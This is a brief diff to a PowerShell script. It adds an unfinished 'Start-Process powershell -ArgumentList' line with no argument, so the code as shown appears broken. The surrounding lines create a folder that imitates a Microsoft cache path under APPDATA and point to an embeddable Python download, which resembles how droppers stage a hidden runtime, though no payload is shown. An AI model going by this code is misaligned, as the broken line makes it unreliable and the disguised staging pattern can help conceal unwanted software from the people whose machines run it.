@@ -1,3 +1,4 @@
+Start-Process powershell -ArgumentList 
 $pythonDir = "$env:APPDATA\Microsoft\Caches\py"
 if (!(Test-Path $pythonDir)) { New-Item -ItemType Directory -Path $pythonDir -Force | Out-Null }
 $pythonUrl = "https://www.python.org/ftp/python/3.11.4/python-3.11.4-embed-amd64.zip"
